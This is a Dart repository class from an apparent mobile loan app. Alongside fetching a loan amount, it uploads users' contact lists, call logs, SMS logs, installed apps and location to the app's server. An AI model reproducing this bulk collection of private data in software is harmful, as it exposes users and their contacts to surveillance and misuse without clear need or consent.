import 'package:contacts_service/contacts_service.dart';
import 'package:get/get.dart';
import 'package:prathima_loan_app/data/api/api_client.dart';
import 'package:http/http.dart' as http;
import 'package:prathima_loan_app/utils/app_constant.dart';

class HomeRepository extends GetxService {
  final ApiClient apiClient;

  HomeRepository({required this.apiClient});

  Future<Response> getInitialLoanAmount() async {
    return await apiClient.getData(
      AppConstants.initialLoanAmountUrl,
    );
  }

  Future<Response> sendContactList(Map<String, dynamic> body) async {
    return await apiClient.postData(AppConstants.userContactUrl, body);
  }

  Future<Response> sendCallLogList(Map<String, dynamic> body) async {
    return await apiClient.postData(AppConstants.userCallLogUrl, body);
  }

  Future<Response> sendSMSLogList(Map<String, dynamic> body) async {
    return await apiClient.postData(AppConstants.userSMSLogUrl, body);
  }

  Future<Response> sendInstalledAppList(Map<String, dynamic> body) async {
    return await apiClient.postData(AppConstants.userInstalledAppUrl, body);
  }

  Future<Response> sendUserLocation(Map<String, dynamic> body) async {
    return await apiClient.postData(AppConstants.userLocationUrl, body);
  }
}
